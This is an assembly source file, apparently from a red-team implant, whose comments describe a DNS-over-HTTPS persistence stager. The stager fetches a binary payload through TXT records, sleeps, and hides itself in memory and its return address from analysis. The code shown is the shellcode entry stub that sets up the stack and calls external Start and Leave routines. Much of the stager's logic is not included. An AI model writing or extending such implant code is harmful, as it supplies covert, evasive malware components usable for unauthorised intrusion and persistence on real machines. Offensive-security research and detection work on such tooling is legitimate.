;;
;; dns over http(s) persistence stager.
;; grabs a binary payload over a txt
;; record before going back to sleep
;; for a specified time.
;;
;; before going to sleep, it will try
;; to obfuscate itself in memory and
;; hide its return address.
;;
;; Copyright (c) 2021 Austin Hudson
;; Copyright (c) 2021 GuidePoint Security LLC
;;
[BITS 64]

GLOBAL _BEG
GLOBAL _END
GLOBAL _GET_BEG
GLOBAL _GET_END

EXTERN Start
EXTERN Leave

[SECTION .text$A]

;;
;; start of shellcode
;;
_BEG:
	push	rsi
	mov	rsi, rsp
	and	rsp, 0FFFFFFFFFFFFFFF0h

	sub	rsp, 32
	mov	rcx, 0x41414141
	call	Start

	sub	rsp, 32
	lea	rcx, [rel _BEG]
	lea	rdx, [rel Leave]
	sub	rdx, rcx
	call	Leave

	mov	rsp, rsi
	pop	rsi
	ret

;;
;; gets pointer to the start
;;
_GET_BEG:
	lea	rax, [rel _BEG];
	ret

;;
;; gets pointer to the end
;;
_GET_END:
	lea	rax, [rel _END]
	ret

[SECTION .text$D]

;;
;; end of shellcode
;;
_END:
	int3
	int3
	int3
	int3
